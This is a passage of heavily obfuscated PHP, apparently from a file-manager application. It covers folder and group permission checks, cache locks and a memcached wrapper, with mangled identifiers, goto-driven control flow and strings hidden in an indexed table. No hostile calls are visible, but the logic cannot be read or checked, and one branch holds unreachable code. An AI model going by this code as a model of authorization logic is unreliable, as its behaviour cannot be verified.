makeSourceAuth($DÆ´œ“»¬À, $a½œ‚ÅÂÖ, $c£ºœÒÒÀÄ = false) { goto C×ÃÊÓ‰ª; E±¸±Ÿ–ì: foreach ($E¦İ¢ÏÜ—ì as $Eìœë—ñœ) { if (!isset($a½œ‚ÅÂÖ[$Eìœë—ñœ])) { continue; } $B˜ğ‚µ½æ = $this->authMake($a½œ‚ÅÂÖ[$Eìœë—ñœ], $c£ºœÒÒÀÄ); if ($B˜ğ‚µ½æ[$f•—¢İ¿[453]]) { $F¾çÅºÆÊÖ = $B˜ğ‚µ½æ; break; } } if (!$d˜î¸Ò–ÆÊ) { return $F¾çÅºÆÊÖ; } if (!$F¾çÅºÆÊÖ && $b¤¦ÁßÒ) { $F¾çÅºÆÊÖ = $this->groupAuthInfo($b¤¦ÁßÒ, $DàÕÕÏ‚Òƒ); } goto e¥öáË®áÍ; f¬ŸãÏ¨Ú: $d˜î¸Ò–ÆÊ = $DÆ´œ“»¬À[$f•—¢İ¿[411]] == SourceModel::TYPE_GROUP; $b¤¦ÁßÒ = $d˜î¸Ò–ÆÊ ? $this->groupRootAuth($DàÕÕÏ‚Òƒ, $c£ºœÒÒÀÄ) : !1; if ($b¤¦ÁßÒ && Model($f•—¢İ¿[1844])->authCheckAction($b¤¦ÁßÒ[$f•—¢İ¿[413]], $f•—¢İ¿[1697])) { return $this->groupAuthInfo($b¤¦ÁßÒ, $DàÕÕÏ‚Òƒ); } goto A»·ÃÈÇÍª; e¥öáË®áÍ: if (!$F¾çÅºÆÊÖ) { $bºƒ†è¹÷• = Model($f•—¢İ¿[493])->getInfo($DàÕÕÏ‚Òƒ); $A‰òÁèº· = explode($f•—¢İ¿[47], trim($bºƒ†è¹÷•[$f•—¢İ¿[494]], $f•—¢İ¿[47])); $A‰òÁèº· = array_reverse($A‰òÁèº·); foreach ($A‰òÁèº· as $DùÓ‚Ğóè) { if ($DùÓ‚Ğóè == $f•—¢İ¿[504] || $DùÓ‚Ğóè == $E©íÓñÒöñ) { continue; } $C„“Ò¶ÕèÖ = $this->groupRootAuth($DùÓ‚Ğóè, $c£ºœÒÒÀÄ); if (!$C„“Ò¶ÕèÖ) { continue; } $F¾çÅºÆÊÖ = $this->groupAuthInfo($C„“Ò¶ÕèÖ, $DùÓ‚Ğóè); break; } } if (!$F¾çÅºÆÊÖ || $F¾çÅºÆÊÖ[$f•—¢İ¿[414]] <= 0) { $b°”Èª¹Ö = $this->authDeepCheck($DÆ´œ“»¬À[$f•—¢İ¿[403]], $c£ºœÒÒÀÄ); if ($b°”Èª¹Ö) { $F¾çÅºÆÊÖ = $b°”Èª¹Ö; } } return $F¾çÅºÆÊÖ; goto AãÊ•µ«×; C×ÃÊÓ‰ª: $f•—¢İ¿ =& $_SERVER[Šº]; $E©íÓñÒöñ = $f•—¢İ¿[87]; $DàÕÕÏ‚Òƒ = $DÆ´œ“»¬À[$f•—¢İ¿[491]]; goto f¬ŸãÏ¨Ú; A»·ÃÈÇÍª: $E¦İ¢ÏÜ—ì = Model($f•—¢İ¿[1192])->parentLevelArray($DÆ´œ“»¬À[$f•—¢İ¿[494]]); $E¦İ¢ÏÜ—ì = array_merge(array($DÆ´œ“»¬À[$f•—¢İ¿[403]]), array_reverse($E¦İ¢ÏÜ—ì)); $F¾çÅºÆÊÖ = !1; goto E±¸±Ÿ–ì; AãÊ•µ«×: } private function userIsRoot($Eº„ŒœñøĞ = false) { $CÃÍïÜöÈ• =& $_SERVER[Šº]; if (!$Eº„ŒœñøĞ && _get($GLOBALS, $CÃÍïÜöÈ•[492])) { return !0; } $D‰®ç™¼¹ = Model($CÃÍïÜöÈ•[514])->getInfo($Eº„ŒœñøĞ); $CÌªÒŒ›ÚØ = Model($CÃÍïÜöÈ•[1865])->listData($D‰®ç™¼¹[$CÃÍïÜöÈ•[1400]]); if ($CÌªÒŒ›ÚØ && $CÌªÒŒ›ÚØ[$CÃÍïÜöÈ•[1270]][$CÃÍïÜöÈ•[1866]] == 1) { return !0; } return !1; } private function sourceAuthInfo($C“Îö—À½) { goto AŒï“«´á†; A—ÌëÕÇá™: if (!$e¶Ï­Ëµ·©) { return !1; } $c´•ãĞÌ¨î->groupPathDisplay($e¶Ï­Ëµ·©); $AÃÇ®ŒÓ‡ = array($e¶Ï­Ëµ·©); goto E®®êø…; AŒï“«´á†: $D‚ÀÒÃ†Âì =& $_SERVER[Šº]; $c´•ãĞÌ¨î = Model($D‚ÀÒÃ†Âì[1192]); $e¶Ï­Ëµ·© = $c´•ãĞÌ¨î->sourceInfo($C“Îö—À½); goto A—ÌëÕÇá™; E®®êø…: $AÃÇ®ŒÓ‡ = $c´•ãĞÌ¨î->_listAppendPath($AÃÇ®ŒÓ‡); $e¶Ï­Ëµ·© = $AÃÇ®ŒÓ‡[0]; $eãëé‘ˆöŒ = $e¶Ï­Ëµ·©[$D‚ÀÒÃ†Âì[502]]; goto C°àè²öï¥; C°àè²öï¥: if (isset($e¶Ï­Ëµ·©[$D‚ÀÒÃ†Âì[499]])) { $A²‡„êŠ… = explode($D‚ÀÒÃ†Âì[8], trim($e¶Ï­Ëµ·©[$D‚ÀÒÃ†Âì[502]], $D‚ÀÒÃ†Âì[8])); array_shift($A²‡„êŠ…); $eãëé‘ˆöŒ = $e¶Ï­Ëµ·©[$D‚ÀÒÃ†Âì[497]] . $D‚ÀÒÃ†Âì[1867] . implode($D‚ÀÒÃ†Âì[8], $A²‡„êŠ…); } return array($D‚ÀÒÃ†Âì[420] => $e¶Ï­Ëµ·©[$D‚ÀÒÃ†Âì[28]], $D‚ÀÒÃ†Âì[76] => KodIO::make($e¶Ï­Ëµ·©[$D‚ÀÒÃ†Âì[403]]), $D‚ÀÒÃ†Âì[1868] => $eãëé‘ˆöŒ); goto B¨Í…ïºÓ÷; B¨Í…ïºÓ÷: } private function groupAuthInfo($d®‰¿“öÎá, $B“ç¤âìÕë) { $eˆë³Ìå„¨ =& $_SERVER[Šº]; $a¨ñõ‰Ğ¥‡ = Model($eˆë³Ìå„¨[493])->getInfo($B“ç¤âìÕë); return array($eˆë³Ìå„¨[1869] => intval($d®‰¿“öÎá[$eˆë³Ìå„¨[413]]), $eˆë³Ìå„¨[1853] => $d®‰¿“öÎá, $eˆë³Ìå„¨[1870] => LNG($eˆë³Ìå„¨[1871]), $eˆë³Ìå„¨[1862] => array($eˆë³Ìå„¨[420] => $a¨ñõ‰Ğ¥‡[$eˆë³Ìå„¨[28]], $eˆë³Ìå„¨[76] => KodIO::make($a¨ñõ‰Ğ¥‡[$eˆë³Ìå„¨[85]][$eˆë³Ìå„¨[403]]), $eˆë³Ìå„¨[1868] => $a¨ñõ‰Ğ¥‡[$eˆë³Ìå„¨[498]])); } protected function groupRootAuth($cÂŞõƒñæÏ, $fîïµ÷¤é = false) { goto D¸å­Ø›Å; f‹™ÑèäÅø: $A†—ÖîÊó¦ = $this->userGroupList($fîïµ÷¤é); $CÀ«Áá—œ¢ = isset($A†—ÖîÊó¦[$cÂŞõƒñæÏ]) ? $A†—ÖîÊó¦[$cÂŞõƒñæÏ][$aõ’œÅéÎ²[413]] : !1; if ($CÀ«Áá—œ¢ && Model($aõ’œÅéÎ²[1844])->authCheckAction($CÀ«Áá—œ¢[$aõ’œÅéÎ²[413]], $aõ’œÅéÎ²[1697])) { $B‹Ö–å¯²·[$B¬¸˜¸Ãè] = $CÀ«Áá—œ¢; return $CÀ«Áá—œ¢; } goto fÑ·šåìå; fÑ·šåìå: $bğ‹óŸ¦Ô„ = $this->sourceAuthSelect($f„„­·‹¯[$aõ’œÅéÎ²[85]][$aõ’œÅéÎ²[403]]); $B·ï·ë¿ = $bğ‹óŸ¦Ô„ ? $this->authMake($bğ‹óŸ¦Ô„, $fîïµ÷¤é) : !1; $eè‘Ò¡‘ƒ¶ = $B·ï·ë¿ ? $B·ï·ë¿[$aõ’œÅéÎ²[453]] : !1; goto F¼Š›†‚óã; B²÷™ğÑñ—: static $B‹Ö–å¯²· = array(); if (isset($B‹Ö–å¯²·[$B¬¸˜¸Ãè])) { return $B‹Ö–å¯²·[$B¬¸˜¸Ãè]; } $f„„­·‹¯ = Model($aõ’œÅéÎ²[493])->getInfo($cÂŞõƒñæÏ); goto f‹™ÑèäÅø; F¼Š›†‚óã: $B‹Ö–å¯²·[$B¬¸˜¸Ãè] = $eè‘Ò¡‘ƒ¶ ? $eè‘Ò¡‘ƒ¶ : $CÀ«Áá—œ¢; return $B‹Ö–å¯²·[$B¬¸˜¸Ãè]; goto cä÷öø®ÇŠ; D¸å­Ø›Å: $aõ’œÅéÎ² =& $_SERVER[Šº]; $fîïµ÷¤é = $fîïµ÷¤é ? $fîïµ÷¤é : USER_ID; $B¬¸˜¸Ãè = $fîïµ÷¤é . $aõ’œÅéÎ²[1872] . $cÂŞõƒñæÏ; goto B²÷™ğÑñ—; cä÷öø®ÇŠ: } public function authOwnerApply($bµï½Ø â) { goto aÀçß«áÅ ; CŸá–±‹ªÓ: $bµï½Ø â[$DÑÏˆ­¯šß[413]][$DÑÏˆ­¯šß[1875]] = Model($DÑÏˆ­¯šß[510])->userListInfo($f“»Ÿç¼¡º); return $bµï½Ø â; goto bÃ¹£ì¢ŒÒ; eæòÇµ¤ìÂ: $D‹‡Ù¿Ôİ¯ = Model($DÑÏˆ­¯šß[1192])->parentLevelArray($bµï½Ø â[$DÑÏˆ­¯šß[494]]); $D‹‡Ù¿Ôİ¯ = array_merge(array($bµï½Ø â[$DÑÏˆ­¯šß[403]]), array_reverse($D‹‡Ù¿Ôİ¯)); $bî÷­¶˜šŸ = $this->sourceAuthSelect($D‹‡Ù¿Ôİ¯); goto F‘‹ÈÏÌ…Ü; aÀçß«áÅ : $DÑÏˆ­¯šß =& $_SERVER[Šº]; if (empty($bµï½Ø â[$DÑÏˆ­¯šß[413]]) || isset($bµï½Ø â[$DÑÏˆ­¯šß[1873]]) && $bµï½Ø â[$DÑÏˆ­¯šß[1873]]) { return $bµï½Ø â; } if (AuthModel::authCheckRoot($bµï½Ø â[$DÑÏˆ­¯šß[413]][$DÑÏˆ­¯šß[414]])) { return $bµï½Ø â; } goto eæòÇµ¤ìÂ; BäØÛ‰ª‡²: if (count($f“»Ÿç¼¡º) == 0) { $f“»Ÿç¼¡º = $this->authFolderOwnerGroup($bµï½Ø â[$DÑÏˆ­¯šß[491]]); } $f“»Ÿç¼¡º = array_unique($f“»Ÿç¼¡º); if (AuthModel::authCheckRoot($bµï½Ø â[$DÑÏˆ­¯šß[413]][$DÑÏˆ­¯šß[414]])) { $f“»Ÿç¼¡º[] = USER_ID; } goto CŸá–±‹ªÓ; F‘‹ÈÏÌ…Ü: $c¼½ÁÀ”íÒ = array(); $f“»Ÿç¼¡º = array(); foreach ($bî÷­¶˜šŸ as $D÷±ç°—ĞÆ => $DØé„Ÿ³‚) { $Aëš¸ñÙÌ = $this->authFolderOwnerUser($DØé„Ÿ³‚); $c¼½ÁÀ”íÒ[$D÷±ç°—ĞÆ] = $Aëš¸ñÙÌ; $f“»Ÿç¼¡º = array_merge($f“»Ÿç¼¡º, $Aëš¸ñÙÌ[$DÑÏˆ­¯šß[570]]); if ($Aëš¸ñÙÌ[$DÑÏˆ­¯šß[1874]]) { break; } } goto BäØÛ‰ª‡²; bÃ¹£ì¢ŒÒ: } private function authFolderOwnerGroup($a´‚ºíó) { $CĞßÖ¾„Ã =& $_SERVER[Šº]; $bÄÌäª„¹› = Model($CĞßÖ¾„Ã[1758])->where(array($CĞßÖ¾„Ã[1677] => $a´‚ºíó))->select(); $D£³É†³ë = array(); if (!$bÄÌäª„¹›) { return $D£³É†³ë; } foreach ($bÄÌäª„¹› as $BšÖ¥Ê»²¶) { $b¹ñ…ßÙğÌ = $this->authInfo($BšÖ¥Ê»²¶); if (AuthModel::authCheckRoot($b¹ñ…ßÙğÌ[$CĞßÖ¾„Ã[413]])) { $D£³É†³ë[] = $BšÖ¥Ê»²¶[$CĞßÖ¾„Ã[1514]]; } } return $D£³É†³ë; } private function authFolderOwnerUser($Cİöƒ…êó) { $AŸõ›®¶óè =& $_SERVER[Šº]; $E¼‡‹âÄºÒ = array(); $Aš›ç·¼ß¹ = !1; foreach ($Cİöƒ…êó as $A´½§›×Œ) { $AÄèË¿ç¥õ = $this->authInfo($A´½§›×Œ); if ($A´½§›×Œ[$AŸõ›®¶óè[491]] == $AŸõ›®¶óè[504]) { $Aš›ç·¼ß¹ = !0; } if ($A´½§›×Œ[$AŸõ›®¶óè[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($AÄèË¿ç¥õ[$AŸõ›®¶óè[413]])) { $E¼‡‹âÄºÒ[] = $A´½§›×Œ[$AŸõ›®¶óè[491]]; } } } return array($AŸõ›®¶óè[570] => $E¼‡‹âÄºÒ, $AŸõ›®¶óè[1874] => $Aš›ç·¼ß¹); } public function authMake($fó¿¦¡Òİ, $f¾…‚—òƒö = false) { $DÍ–œ‚›ÛÌ =& $_SERVER[Šº]; $EáÏÉ’½¡« = $this->authArrayCheck($fó¿¦¡Òİ, $f¾…‚—òƒö); if ($EáÏÉ’½¡«[$DÍ–œ‚›ÛÌ[1876]]) { $EáÏÉ’½¡«[$DÍ–œ‚›ÛÌ[1876]] = $this->sourceAuthInfo($EáÏÉ’½¡«[$DÍ–œ‚›ÛÌ[1876]]); } return $EáÏÉ’½¡«; } public function authArrayCheck($A³Œ½µ÷³Í, $dÍ”«ÖÆÃ = false) { goto Eé³Ó¤ÜƒŞ; B£ññÚ‡°¡: return $c‰àã¯ÈÍá; goto d Œ¶ò˜ÛÜ; E³‰ŞÉÚ: $dÀ‡áÖ¥³ = 1000; $b”îˆµÕ±³ = 0; $böˆ¤°ßÙ = 0; goto DÕË‚¤õ•; cçå‡õÒ¹Ô: $F±ÆÓÑÉâ” = 0; $Bòˆ›‡ƒ° = 0; $e¢–ÁŠ‡™ä = 0; goto fØ·»Û·ñ; fØ·»Û·ñ: $D„–Ê°îóÂ = 0; $F“™ÖÆ×“ = 0; $föÀ•‘¢‘ = 0; goto E³‰ŞÉÚ; Eé³Ó¤ÜƒŞ: $FÎîÖ¢Çâ­ =& $_SERVER[Šº]; if (!$A³Œ½µ÷³Í) { return array($FÎîÖ¢Çâ­[414] => 0, $FÎîÖ¢Çâ­[453] => !1); } $dÍ”«ÖÆÃ = $dÍ”«ÖÆÃ ? $dÍ”«ÖÆÃ : USER_ID; goto cçå‡õÒ¹Ô; DÕË‚¤õ•: $BŸñ¾ù‘… = 0; $A•Œ ¦Ï© = 0; $B‰®¢¡Úõã = array($FÎîÖ¢Çâ­[403] => 0); goto dó´ãŠØØ; dó´ãŠØØ: foreach ($A³Œ½µ÷³Í as $B‰®¢¡Úõã) { $E‚ÙÖÔ¨Š° = $this->authInfo($B‰®¢¡Úõã); if (!$E‚ÙÖÔ¨Š°) { continue; } $EÚãÊâµ = $B‰®¢¡Úõã[$FÎîÖ¢Çâ­[491]]; $BÈê¨ˆ–Û¼ = intval($E‚ÙÖÔ¨Š°[$FÎîÖ¢Çâ­[413]]); if ($B‰®¢¡Úõã[$FÎîÖ¢Çâ­[411]] == SourceModel::TYPE_USER && $EÚãÊâµ == $dÍ”«ÖÆÃ) { $F±ÆÓÑÉâ” = !0; $e¢–ÁŠ‡™ä = $E‚ÙÖÔ¨Š°; $Bòˆ›‡ƒ° = $BÈê¨ˆ–Û¼; } else { if ($B‰®¢¡Úõã[$FÎîÖ¢Çâ­[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($EÚãÊâµ, $dÍ”«ÖÆÃ)) { $D„–Ê°îóÂ = !0; $F´„´–¥Ü = $this->groupStepToUserGroup($EÚãÊâµ, $dÍ”«ÖÆÃ); if ($F´„´–¥Ü < $dÀ‡áÖ¥³) { $dÀ‡áÖ¥³ = $F´„´–¥Ü; $F“™ÖÆ×“ = $BÈê¨ˆ–Û¼; $föÀ•‘¢‘ = $E‚ÙÖÔ¨Š°; $b”îˆµÕ±³ = $EÚãÊâµ; } if ($F´„´–¥Ü == $dÀ‡áÖ¥³ && $BÈê¨ˆ–Û¼ >= $F“™ÖÆ×“) { $F“™ÖÆ×“ = $BÈê¨ˆ–Û¼; $föÀ•‘¢‘ = $E‚ÙÖÔ¨Š°; $b”îˆµÕ±³ = $EÚãÊâµ; } } else { if ($EÚãÊâµ == $FÎîÖ¢Çâ­[504]) { $böˆ¤°ßÙ = !0; $A•Œ ¦Ï© = $E‚ÙÖÔ¨Š°; $BŸñ¾ù‘… = $BÈê¨ˆ–Û¼; } } } } if ($F±ÆÓÑÉâ”) { $eªÕİ”¼ÂÈ = $Bòˆ›‡ƒ°; $E‚ÙÖÔ¨Š° = $e¢–ÁŠ‡™ä; $c®ÄÄ•’ß… = LNG($FÎîÖ¢Çâ­[1877]); } else { if ($D„–Ê°îóÂ) { $eªÕİ”¼ÂÈ = $F“™ÖÆ×“; $E‚ÙÖÔ¨Š° = $föÀ•‘¢‘; $b¦èßšÁ°´ = Model($FÎîÖ¢Çâ­[493])->getInfo($b”îˆµÕ±³); $c®ÄÄ•’ß… = $FÎîÖ¢Çâ­[160] . $b¦èßšÁ°´[$FÎîÖ¢Çâ­[498]] . $FÎîÖ¢Çâ­[1878] . LNG($FÎîÖ¢Çâ­[1879]); } else { if ($böˆ¤°ßÙ) { $eªÕİ”¼ÂÈ = $BŸñ¾ù‘…; $E‚ÙÖÔ¨Š° = $A•Œ ¦Ï©; $c®ÄÄ•’ß… = LNG($FÎîÖ¢Çâ­[1850]); } else { $eªÕİ”¼ÂÈ = 0; $E‚ÙÖÔ¨Š° = !1; $c®ÄÄ•’ß… = $FÎîÖ¢Çâ­[33]; } } } $c‰àã¯ÈÍá = array($FÎîÖ¢Çâ­[1869] => intval($eªÕİ”¼ÂÈ), $FÎîÖ¢Çâ­[1853] => $E‚ÙÖÔ¨Š°, $FÎîÖ¢Çâ­[1870] => $c®ÄÄ•’ß…, $FÎîÖ¢Çâ­[1862] => $B‰®¢¡Úõã[$FÎîÖ¢Çâ­[403]]); goto B£ññÚ‡°¡; d Œ¶ò˜ÛÜ: } private function groupContainUser($c—Àù‹è”, $eŒÑãŠÌ”— = false) { return in_array($c—Àù‹è”, $this->userGroupParents($eŒÑãŠÌ”—)); } private function groupStepToUserGroup($Eš¤¯ŒµĞ, $d­¬¢ÍèÃÈ = false) { goto Dì²ù„ÒÁ•; bÚì­õ”Ç: return $E­ù…Áöóİ; goto A…±Ü„Üêâ; FŠñòë³ Ù: $EØå¶×ºÏâ = $GLOBALS[$C¦¶Í‹Ï§É[6]][$C¦¶Í‹Ï§É[88]][$C¦¶Í‹Ï§É[1769]] == 1; $bà××Öæ³ï = $EØå¶×ºÏâ ? 3 : 2; foreach ($e ¦¾¯¨‘é as $BµçÀùÑ­×) { if ($BµçÀùÑ­×[$C¦¶Í‹Ï§É[1677]] == $Eš¤¯ŒµĞ) { return 0; } $EŸŞõææÓ¶ = explode($C¦¶Í‹Ï§É[47], trim($BµçÀùÑ­×[$C¦¶Í‹Ï§É[494]], $C¦¶Í‹Ï§É[47])); if ($EŸŞõææÓ¶[0] == $C¦¶Í‹Ï§É[504] && count($EŸŞõææÓ¶) > $bà××Öæ³ï) { $C…ŸæŠ§± = array_reverse(array_slice($EŸŞõææÓ¶, $bà××Öæ³ï)); $d«¬«¶Õ´˜ = array_search($Eš¤¯ŒµĞ, $C…ŸæŠ§±); if ($d«¬«¶Õ´˜ !== !1 && $d«¬«¶Õ´˜ + 1 <= $E­ù…Áöóİ) { $E­ù…Áöóİ = $d«¬«¶Õ´˜ + 1; } } } goto bÚì­õ”Ç; Dì²ù„ÒÁ•: $C¦¶Í‹Ï§É =& $_SERVER[Šº]; $e ¦¾¯¨‘é = $this->userGroupList($d­¬¢ÍèÃÈ); $E­ù…Áöóİ = 1000; goto FŠñòë³ Ù; A…±Ü„Üêâ: } private function userGroupList($aŸä¼ãøÑ = false) { $cŒœ‹¶Áç‡ =& $_SERVER[Šº]; static $aÃ•Ş²ÎÓ = array(); if (isset($aÃ•Ş²ÎÓ[$aŸä¼ãøÑ])) { return $aÃ•Ş²ÎÓ[$aŸä¼ãøÑ]; } $b–¨òÀ™Î = Model($cŒœ‹¶Áç‡[514])->getInfo($aŸä¼ãøÑ); $aÃ•Ş²ÎÓ[$aŸä¼ãøÑ] = array_to_keyvalue($b–¨òÀ™Î[$cŒœ‹¶Áç‡[1851]], $cŒœ‹¶Áç‡[1677]); return $aÃ•Ş²ÎÓ[$aŸä¼ãøÑ]; } public function userGroupParents($a¼£Êƒ¨ïŠ) { goto Döˆ—¸’Çè; cĞ¦Š±ëİ³: if (isset($DñÄ…½±Û[$a¼£Êƒ¨ïŠ])) { return $DñÄ…½±Û[$a¼£Êƒ¨ïŠ]; } $Fñ¹‡’ÙÑµ = $this->userGroupList($a¼£Êƒ¨ïŠ); $a²®ˆÑ†óñ = array(); goto cÙö„¸ñ†; cÙö„¸ñ†: $BÈˆ–›¸ = $GLOBALS[$AÏ¾ğÄƒˆ[6]][$AÏ¾ğÄƒˆ[88]][$AÏ¾ğÄƒˆ[1769]] == 1; $b…øè‡°î = $BÈˆ–›¸ ? 3 : 2; foreach ($Fñ¹‡’ÙÑµ as $F÷ìŠé–î) { $D§Ü•Ñ³ºå = array($F÷ìŠé–î[$AÏ¾ğÄƒˆ[1677]]); $E¨±ÄùÉÚª = explode($AÏ¾ğÄƒˆ[47], trim($F÷ìŠé–î[$AÏ¾ğÄƒˆ[494]], $AÏ¾ğÄƒˆ[47])); if ($E¨±ÄùÉÚª[0] == $AÏ¾ğÄƒˆ[504] && count($E¨±ÄùÉÚª) > $b…øè‡°î) { $A‹…ƒ½æÙæ = array_slice($E¨±ÄùÉÚª, $b…øè‡°î); $D§Ü•Ñ³ºå = array_merge($D§Ü•Ñ³ºå, array_reverse($A‹…ƒ½æÙæ)); } $a²®ˆÑ†óñ = array_merge($a²®ˆÑ†óñ, $D§Ü•Ñ³ºå); } goto A™éöÉàÙº; Döˆ—¸’Çè: $AÏ¾ğÄƒˆ =& $_SERVER[Šº]; static $DñÄ…½±Û = array(); $a¼£Êƒ¨ïŠ = $a¼£Êƒ¨ïŠ ? $a¼£Êƒ¨ïŠ : USER_ID; goto cĞ¦Š±ëİ³; A™éöÉàÙº: $DñÄ…½±Û[$a¼£Êƒ¨ïŠ] = array_unique($a²®ˆÑ†óñ); return $DñÄ…½±Û[$a¼£Êƒ¨ïŠ]; goto bø”ŸÄ£Ü; bø”ŸÄ£Ü: } public function authTargetInfoMake($F´•£îÀÈŠ) { goto FÊà²ÒÌÓ; FÊà²ÒÌÓ: $B¡¬£ƒêñ =& $_SERVER[Šº]; $fªÕÈ×•ƒó = array(); $d•Â„îÌÎ = array(); goto cËÑ—“Ùº; bÆ¶¿ã¸šä: return array($B¡¬£ƒêñ[1881] => $fªÕÈ×•ƒó, $B¡¬£ƒêñ[1882] => $d•Â„îÌÎ); goto b‡¬åÙÈÅİ; cËÑ—“Ùº: foreach ($F´•£îÀÈŠ as $B©ÕÛ¿à©´) { if ($B©ÕÛ¿à©´[$B¡¬£ƒêñ[411]] == SourceModel::TYPE_USER) { $fªÕÈ×•ƒó[] = intval($B©ÕÛ¿à©´[$B¡¬£ƒêñ[491]]); } else { if ($B©ÕÛ¿à©´[$B¡¬£ƒêñ[411]] == SourceModel::TYPE_GROUP) { $d•Â„îÌÎ[] = intval($B©ÕÛ¿à©´[$B¡¬£ƒêñ[491]]); } } } if ($fªÕÈ×•ƒó) { $fªÕÈ×•ƒó = Model($B¡¬£ƒêñ[510])->userListInfo($fªÕÈ×•ƒó); } if ($d•Â„îÌÎ) { $dùêŒŸ–Ü› = array($B¡¬£ƒêñ[1755] => array($B¡¬£ƒêñ[418], $d•Â„îÌÎ)); $d•Â„îÌÎ = Model($B¡¬£ƒêñ[493])->field($B¡¬£ƒêñ[1880])->where($dùêŒŸ–Ü›)->select(); $d•Â„îÌÎ = array_to_keyvalue($d•Â„îÌÎ, $B¡¬£ƒêñ[1677]); } goto bÆ¶¿ã¸šä; b‡¬åÙÈÅİ: } public function authInfo($Aé —é–š) { $Cµ¬·Š‰ŠÄ =& $_SERVER[Šº]; if ($Aé —é–š[$Cµ¬·Š‰ŠÄ[1772]]) { $eˆ÷ÛÂàÖæ = Model($Cµ¬·Š‰ŠÄ[1844])->listData($Aé —é–š[$Cµ¬·Š‰ŠÄ[1772]]); if (!$eˆ÷ÛÂàÖæ) { return !1; $eÁùŠ‰¿³ê = Model($Cµ¬·Š‰ŠÄ[1844])->listData(); $eÃáÔ‚Ò»› = array_filter_by_field($eÁùŠ‰¿³ê, $Cµ¬·Š‰ŠÄ[413], $Cµ¬·Š‰ŠÄ[504]); return $eÃáÔ‚Ò»›; } $Dƒ×äï¾í = array_field_key($eˆ÷ÛÂàÖæ, array($Cµ¬·Š‰ŠÄ[392], $Cµ¬·Š‰ŠÄ[28], $Cµ¬·Š‰ŠÄ[413], $Cµ¬·Š‰ŠÄ[1698], $Cµ¬·Š‰ŠÄ[1700])); $Dƒ×äï¾í[$Cµ¬·Š‰ŠÄ[1883]] = $Aé —é–š; return $Dƒ×äï¾í; } else { return array($Cµ¬·Š‰ŠÄ[419] => 0, $Cµ¬·Š‰ŠÄ[1683] => $Aé —é–š[$Cµ¬·Š‰ŠÄ[1826]], $Cµ¬·Š‰ŠÄ[420] => $Cµ¬·Š‰ŠÄ[33], $Cµ¬·Š‰ŠÄ[1698] => $Cµ¬·Š‰ŠÄ[1884]); } } } goto FÇŸÔãŸ‡ë; Bº½ù’çê…: class CacheLockMemcached { public function lock($Cƒ’¥ âŸè, $d–ùó…¤ÔÛ = 0) { $bØø–Ãİáğ = Cache::init(); $fƒøâµˆÂ = microtime(!0) + $d–ùó…¤ÔÛ; while (microtime(!0) < $fƒøâµˆÂ) { $BÊ›¦ŒÍíº = $bØø–Ãİáğ->get($Cƒ’¥ âŸè); if (!$BÊ›¦ŒÍíº || $BÊ›¦ŒÍíº < microtime(!0)) { $EêÊŒø¬ˆ = $bØø–Ãİáğ->handle->add($Cƒ’¥ âŸè, $fƒøâµˆÂ, $d–ùó…¤ÔÛ); if ($EêÊŒø¬ˆ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($b»ôƒ°´Á) { return Cache::init()->get($b»ôƒ°´Á); } public function unlock($fºò¤óæµ) { return Cache::init()->remove($fºò¤óæµ); } } class CacheLockDatabase { public function lock($FŠ—Ëá ĞÈ, $cÍ¯®Üß•Ì = 0) { $D±ùˆ¢ÒØ = Model($_SERVER[Šº][792]); $FÏòŠ¹Õ = microtime(!0) + $cÍ¯®Üß•Ì; while (microtime(!0) < $FÏòŠ¹Õ) { $F¶¾Öã…Î = $D±ùˆ¢ÒØ->get($FŠ—Ëá ĞÈ); if (!$F¶¾Öã…Î || $F¶¾Öã…Î < microtime(!0)) { $eïˆ¤‹·—Á = $D±ùˆ¢ÒØ->set($FŠ—Ëá ĞÈ, $FÏòŠ¹Õ); if ($eïˆ¤‹·—Á) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($AÑ§Œ–‘´) { return Model($_SERVER[Šº][792])->get($AÑ§Œ–‘´); } public function unlock($Fù½¤»Ë‚) { Model($_SERVER[Šº][792])->remove($Fù½¤»Ë‚); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($d”ÂØÚÌÒº, $cÂßêÖ‹ÙØ) { $AÌ‡†¡ØÜÈ =& $_SERVER[Šº]; if (!class_exists($AÌ‡†¡ØÜÈ[819])) { show_json($AÌ‡†¡ØÜÈ[820], !1); } $this->cacheTime = $cÂßêÖ‹ÙØ; $this->handle = new Memcached(); if (is_array($d”ÂØÚÌÒº[$AÌ‡†¡ØÜÈ[821]]) && count($d”ÂØÚÌÒº[$AÌ‡†¡ØÜÈ[821]]) >= 1) { foreach ($d”ÂØÚÌÒº[$AÌ‡†¡ØÜÈ[821]] as $fµó×ÔÊ£Ê) { $f¼ÖïÏìäµ = explode($AÌ‡†¡ØÜÈ[4], $fµó×ÔÊ£Ê); $this->handle->addServer($f¼ÖïÏìäµ[0], $f¼ÖïÏìäµ[1]); } } else { $this->handle->addServer($d”ÂØÚÌÒº[$AÌ‡†¡ØÜÈ[175]], $d”ÂØÚÌÒº[$AÌ‡†¡ØÜÈ[176]]); } } public function set($B²òßêöñ, $C‹­Ûù”Øå, $F©ƒ½ã§óœ = false) { $F©ƒ½ã§óœ = $F©ƒ½ã§óœ ? $F©ƒ½ã§óœ : $this->cacheTime; return $this->handle->set($B²òßêöñ, $C‹­Ûù”Øå, $F©ƒ½ã§óœ); } public function get($a¢¹‚æå‚ö) { return $this->handle->get($a¢¹‚æå‚ö); } public function remove($e»§”‘·„ ) { return $this->handle->delete($e»§”‘·„ ); } public function deleteAll() { return $this->handle->flush(); } } goto câµÊî¾¨¼; Cä¬°ë†ßÀ: function binCheckBigger($fàæ»ï•ëë, $EªÑçÓç–¼) { return $fàæ»ï•ëë > $EªÑçÓç–¼; } $_SERVER[$_SERVER[ÇÚ][3]] = ("\70\71\67\62"."\71\70")+0;$_Kenw="T7qjr4YwQruXCR4JpxnwnpMSBtmWivC5hczVad3if6U4sCpGrNaXK8tqT6UkvKXFeveIf6HDDEDi9zgAPB";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($f³×Û¹Ï, $bªÔ–Ò‘½Ÿ) { $bß¶³Í  =& $_SERVER[Šº]; if (isset(self::$_methodList[$f³×Û¹Ï])) { return @call_user_func_array(self::$_methodList[$f³×Û¹Ï], $bªÔ–Ò‘½Ÿ); } else { if (method_exists($this, $f³×Û¹Ï)) { return call_user_func_array(array($this, $f³×Û¹Ï), $bªÔ–Ò‘½Ÿ); } else { think_exception(__CLASS__ . $bß¶³Í 